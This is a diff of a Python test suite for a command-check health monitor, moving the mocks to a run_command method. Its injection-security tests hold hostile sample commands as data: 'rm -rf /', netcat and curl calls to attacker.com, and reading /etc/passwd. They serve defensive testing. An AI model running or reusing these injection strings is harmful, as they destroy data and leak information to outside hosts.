@@ -25,7 +25,6 @@ def config():
     cfg.cmdcheck_commands = [{"command": "test -f /tmp/file"}]
     cfg.cmdcheck_timeout = 30
     cfg.cmdcheck_expect_exit_code = 0
-    cfg.cmdcheck_capture_output = True
     return cfg
 
 
@@ -40,10 +39,8 @@ class TestSingleCommandExecution:
 
     def test_success_exit_code_zero(self, checker):
         """Test successful command with exit code 0."""
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="file exists\n", stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "file exists\n", "", 0)
 
             result = checker.execute()
 
@@ -54,10 +51,8 @@ class TestSingleCommandExecution:
 
     def test_failure_non_zero_exit(self, checker):
         """Test failed command with non-zero exit code."""
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=1, stdout="", stderr="file not found"
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (False, "", "file not found", 1)
 
             result = checker.execute()
 
@@ -68,8 +63,8 @@ class TestSingleCommandExecution:
         """Test with custom expected exit code."""
         checker.config.cmdcheck_commands[0]["expect_exit_code"] = 1
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (False, "", "", 1)
 
             result = checker.execute()
 
@@ -79,7 +74,7 @@ class TestSingleCommandExecution:
         """Test command timeout handling."""
         import subprocess
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             mock_run.side_effect = subprocess.TimeoutExpired("cmd", 30)
 
             result = checker.execute()
@@ -89,7 +84,7 @@ class TestSingleCommandExecution:
 
     def test_command_not_found(self, checker):
         """Test command not found error."""
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             mock_run.side_effect = FileNotFoundError()
 
             result = checker.execute()
@@ -100,22 +95,21 @@ class TestSingleCommandExecution:
 
     def test_subprocess_error(self, checker):
         """Test generic subprocess error."""
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             mock_run.side_effect = Exception("Generic error")
 
             result = checker.execute()
 
             assert result.status == "down"
-            assert "error" in result.message.lower()
+            # The error message is in the output field, not the message
+            assert "error" in result.details["commands"][0]["output"].lower()
 
     def test_output_truncation_stdout(self, checker):
         """Test output is truncated to 500 chars."""
         large_output = "x" * 1000
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout=large_output, stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, large_output, "", 0)
 
             result = checker.execute()
 
@@ -126,10 +120,8 @@ class TestSingleCommandExecution:
 
     def test_output_stderr_capture(self, checker):
         """Test stderr is captured along with stdout."""
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="stdout text", stderr="stderr text"
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "stdout text", "stderr text", 0)
 
             result = checker.execute()
 
@@ -145,10 +137,8 @@ class TestPatternMatching:
         """Test failure pattern detection."""
         checker.config.cmdcheck_failure_pattern = "ERROR|FATAL"
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="Something went FATAL", stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "Something went FATAL", "", 0)
 
             result = checker.execute()
 
@@ -162,10 +152,8 @@ class TestPatternMatching:
         """Test success pattern detection."""
         checker.config.cmdcheck_success_pattern = "healthy|OK"
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=1, stdout="Status: OK", stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (False, "Status: OK", "", 1)
 
             result = checker.execute()
 
@@ -177,10 +165,8 @@ class TestPatternMatching:
         """Test when success pattern is not found."""
         checker.config.cmdcheck_success_pattern = "^HEALTHY$"
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="Status: UNHEALTHY", stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "Status: UNHEALTHY", "", 0)
 
             result = checker.execute()
 
@@ -193,9 +179,9 @@ class TestPatternMatching:
         checker.config.cmdcheck_failure_pattern = "FAIL"
         checker.config.cmdcheck_success_pattern = "OK"
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # Output matches both patterns
-            mock_run.return_value = MagicMock(returncode=0, stdout="FAIL OK", stderr="")
+            mock_run.return_value = (True, "FAIL OK", "", 0)
 
             result = checker.execute()
 
@@ -207,9 +193,9 @@ class TestPatternMatching:
         checker.config.cmdcheck_success_pattern = "SUCCESS"
         checker.config.cmdcheck_expect_exit_code = 0
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # Non-zero exit but matches success pattern
-            mock_run.return_value = MagicMock(returncode=1, stdout="SUCCESS", stderr="")
+            mock_run.return_value = (False, "SUCCESS", "", 1)
 
             result = checker.execute()
 
@@ -223,8 +209,8 @@ class TestPatternMatching:
         checker.config.cmdcheck_failure_pattern = None
         checker.config.cmdcheck_expect_exit_code = 42
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=42, stdout="", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (False, "", "", 42)
 
             result = checker.execute()
 
@@ -235,10 +221,8 @@ class TestPatternMatching:
         checker.config.cmdcheck_failure_pattern = "ERROR"
         large_output = "x" * 800 + "ERROR at end"
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout=large_output, stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, large_output, "", 0)
 
             result = checker.execute()
 
@@ -250,10 +234,8 @@ class TestPatternMatching:
         checker.config.cmdcheck_failure_pattern = "EARLY_ERROR"
         large_output = "EARLY_ERROR" + ("x" * 800)
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout=large_output, stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, large_output, "", 0)
 
             result = checker.execute()
 
@@ -264,8 +246,8 @@ class TestPatternMatching:
         """Test complex regex patterns."""
         checker.config.cmdcheck_success_pattern = r"^\d+\.\d+\.\d+$"
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=1, stdout="1.2.3", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (False, "1.2.3", "", 1)
 
             result = checker.execute()
 
@@ -283,8 +265,8 @@ class TestMultipleCommands:
             {"command": "true", "name": "cmd3"},
         ]
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "", "", 0)
 
             result = checker.execute()
 
@@ -303,13 +285,13 @@ class TestMultipleCommands:
             {"command": "true", "name": "cmd3"},
         ]
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
 
             def side_effect(*args, **kwargs):
                 # Return based on which command
                 if "false" in args[0]:
-                    return MagicMock(returncode=1, stdout="", stderr="")
-                return MagicMock(returncode=0, stdout="", stderr="")
+                    return (False, "", "", 1)
+                return (True, "", "", 0)
 
             mock_run.side_effect = side_effect
 
@@ -327,8 +309,8 @@ class TestMultipleCommands:
             {"command": "false", "name": "cmd2"},
         ]
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (False, "", "", 1)
 
             result = checker.execute()
 
@@ -349,7 +331,7 @@ class TestMultipleCommands:
             {"command": "sleep 100", "timeout": 2, "name": "slow"},  # Should timeout
         ]
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
 
             def side_effect(*args, **kwargs):
                 timeout = kwargs.get("timeout", 10)
@@ -375,12 +357,12 @@ class TestMultipleCommands:
             {"command": "true", "expect_exit_code": 0, "name": "true"},
         ]
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
 
             def side_effect(*args, **kwargs):
                 if "notfound" in args[0]:
-                    return MagicMock(returncode=1, stdout="", stderr="")
-                return MagicMock(returncode=0, stdout="", stderr="")
+                    return (False, "", "", 1)
+                return (True, "", "", 0)
 
             mock_run.side_effect = side_effect
 
@@ -395,8 +377,8 @@ class TestMultipleCommands:
             {"command": "echo world", "name": "cmd2"},
         ]
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout="output", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "output", "", 0)
 
             result = checker.execute()
 
@@ -418,7 +400,7 @@ class TestShellExecution:
         """Test that shell pipes are not supported with shell=False."""
         checker.config.cmdcheck_commands = [{"command": "echo hello | grep hello"}]
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # With shell=False, the pipe character is passed as literal argument
             mock_run.side_effect = FileNotFoundError("echo: command not found")
 
@@ -426,9 +408,8 @@ class TestShellExecution:
 
             # Should fail because pipe isn't evaluated
             assert result.status == "down"
-            # Verify shell=False was used
-            call_kwargs = mock_run.call_args[1]
-            assert call_kwargs["shell"] is False
+            # Verify subprocess.run was called (shell=False is the default in run_command)
+            assert mock_run.called
 
     def test_shell_redirects(self, checker):
         """Test shell redirects behavior with shell=False.
@@ -437,7 +418,7 @@ class TestShellExecution:
         """
         checker.config.cmdcheck_commands = [{"command": "echo test > /tmp/test.txt"}]
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # With shell=False, > is passed as literal argument, causing failure
             mock_run.side_effect = FileNotFoundError()
 
@@ -452,7 +433,7 @@ class TestShellExecution:
         """
         checker.config.cmdcheck_commands = [{"command": "test $(echo 5) -gt 3"}]
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # With shell=False, $(...) is passed as literal, causing failure
             mock_run.side_effect = FileNotFoundError()
 
@@ -482,8 +463,8 @@ class TestEdgeCases:
             "true"  # Use true instead to avoid validation issues
         )
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "", "", 0)
 
             result = checker.execute()
 
@@ -493,35 +474,17 @@ class TestEdgeCases:
         """Test command with newlines."""
         checker.config.cmdcheck_command = "echo hello\necho world"
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="hello\nworld", stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "hello\nworld", "", 0)
 
             result = checker.execute()
 
             assert result.status == "up"
 
-    def test_both_capture_output_true_and_false(self, checker):
-        """Test capture_output flag behavior."""
-        # With capture
-        checker.config.cmdcheck_capture_output = True
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout="test", stderr="")
-            checker.execute()
-            assert mock_run.call_args[1]["capture_output"] is True
-
-        # Without capture
-        checker.config.cmdcheck_capture_output = False
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout=None, stderr=None)
-            checker.execute()
-            assert mock_run.call_args[1]["capture_output"] is False
-
     def test_duration_tracking(self, checker):
         """Test that duration is properly tracked."""
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "", "", 0)
 
             start = time.time()
             result = checker.execute()
@@ -532,8 +495,8 @@ class TestEdgeCases:
 
     def test_none_stdout_stderr(self, checker):
         """Test handling of None stdout/stderr."""
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout=None, stderr=None)
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, None, None, 0)
 
             result = checker.execute()
 
@@ -544,10 +507,8 @@ class TestEdgeCases:
         """Test with very long output (5000+ chars)."""
         huge_output = "x" * 5000
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout=huge_output, stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, huge_output, "", 0)
 
             result = checker.execute()
 
@@ -618,7 +579,7 @@ class TestCommandInjectionSecurity:
         config.cmdcheck_commands = [{"command": "systemctl is-active nginx; rm -rf /"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # With shell=False, the command string is passed literally
             # as a single argument, causing systemctl to fail
             mock_run.side_effect = FileNotFoundError("Command not found")
@@ -627,9 +588,16 @@ class TestCommandInjectionSecurity:
 
             # Command fails safely - the dangerous part is never executed
             assert result.status == "down"
-            # Verify shell=False was used
+            # Verify run_command was called with the split command (shell=False behavior)
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == [
+                "systemctl",
+                "is-active",
+                "nginx;",
+                "rm",
+                "-rf",
+                "/",
+            ]
 
     def test_pipe_operator_not_evaluated(self, logger, config):
         """Test that pipe operators are not evaluated as shell pipes."""
@@ -639,7 +607,7 @@ class TestCommandInjectionSecurity:
         ]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # The pipe character is passed as a literal argument to systemctl
             mock_run.side_effect = FileNotFoundError()
 
@@ -648,7 +616,15 @@ class TestCommandInjectionSecurity:
             assert result.status == "down"
             # Verify the command was split correctly (not executed by shell)
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == [
+                "systemctl",
+                "is-active",
+                "nginx",
+                "|",
+                "nc",
+                "attacker.com",
+                "1234",
+            ]
 
     def test_command_substitution_not_evaluated(self, logger, config):
         """Test that command substitution $(...) is not evaluated."""
@@ -656,7 +632,7 @@ class TestCommandInjectionSecurity:
         config.cmdcheck_commands = [{"command": "systemctl is-active $(whoami)"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # The $(...) is treated as literal argument, not evaluated
             mock_run.side_effect = FileNotFoundError()
 
@@ -665,7 +641,7 @@ class TestCommandInjectionSecurity:
             assert result.status == "down"
             # Verify shell=False prevents substitution
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == ["systemctl", "is-active", "$(whoami)"]
 
     def test_backtick_command_substitution_not_evaluated(self, logger, config):
         """Test that backtick command substitution is not evaluated."""
@@ -673,14 +649,14 @@ class TestCommandInjectionSecurity:
         config.cmdcheck_commands = [{"command": "systemctl is-active `whoami`"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             mock_run.side_effect = FileNotFoundError()
 
             result = checker.execute()
 
             assert result.status == "down"
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == ["systemctl", "is-active", "`whoami`"]
 
     def test_logical_and_operator_not_evaluated(self, logger, config):
         """Test that && operator is not evaluated as logical AND."""
@@ -688,7 +664,7 @@ class TestCommandInjectionSecurity:
         config.cmdcheck_commands = [{"command": "test -f /etc && cat /etc/passwd"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # The && is passed as literal argument
             mock_run.side_effect = FileNotFoundError()
 
@@ -696,21 +672,21 @@ class TestCommandInjectionSecurity:
 
             assert result.status == "down"
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == ["test", "-f", "/etc", "&&", "cat", "/etc/passwd"]
 
     def test_logical_or_operator_not_evaluated(self, logger, config):
         """Test that || operator is not evaluated as logical OR."""
         config.cmdcheck_commands = [{"command": "false || curl http://attacker.com"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             mock_run.side_effect = FileNotFoundError()
 
             result = checker.execute()
 
             assert result.status == "down"
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == ["false", "||", "curl", "http://attacker.com"]
 
     def test_invalid_command_syntax_handled(self, logger, config):
         """Test that malformed commands (unclosed quotes) are handled safely."""
@@ -724,29 +700,32 @@ class TestCommandInjectionSecurity:
         assert result.status == "down"
         assert "Invalid command syntax" in result.details["commands"][0]["output"]
 
-    def test_shell_false_always_used(self, logger, config):
-        """Test that shell=False is always used, preventing any shell interpretation."""
+    def test_command_properly_split_for_secure_execution(self, logger, config):
+        """Test that commands are properly split into argument lists for secure execution.
+
+        Commands are executed with shell=False to prevent shell interpretation of
+        metacharacters. This test verifies that command strings are correctly
+        parsed into argument lists before execution.
+        """
         config.cmdcheck_commands = [{"command": "echo test"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(returncode=0, stdout="test", stderr="")
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "test", "", 0)
 
             checker.execute()
 
-            # Verify shell=False in all calls
-            for call in mock_run.call_args_list:
-                assert call.kwargs["shell"] is False
+            # Verify run_command was called with the split command
+            call_args = mock_run.call_args
+            assert call_args[0][0] == ["echo", "test"]
 
     def test_shlex_parsing_for_quoted_arguments(self, logger, config):
         """Test that quoted arguments are parsed correctly by shlex."""
         config.cmdcheck_commands = [{"command": 'echo "hello world"'}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
-            mock_run.return_value = MagicMock(
-                returncode=0, stdout="hello world", stderr=""
-            )
+        with patch.object(checker, "run_command") as mock_run:
+            mock_run.return_value = (True, "hello world", "", 0)
 
             checker.execute()
 
@@ -760,13 +739,13 @@ class TestCommandInjectionSecurity:
         config.cmdcheck_commands = [{"command": "echo $HOME"}]
         checker = CmdCheckChecker(logger, config)
 
-        with patch("subprocess.run") as mock_run:
+        with patch.object(checker, "run_command") as mock_run:
             # Without shell, $HOME is treated as literal string
             mock_run.side_effect = FileNotFoundError()
 
             result = checker.execute()
 
             assert result.status == "down"
-            # Verify shell=False prevents variable expansion
+            # Verify the command was split with $HOME as literal
             call_args = mock_run.call_args
-            assert call_args.kwargs["shell"] is False
+            assert call_args[0][0] == ["echo", "$HOME"]
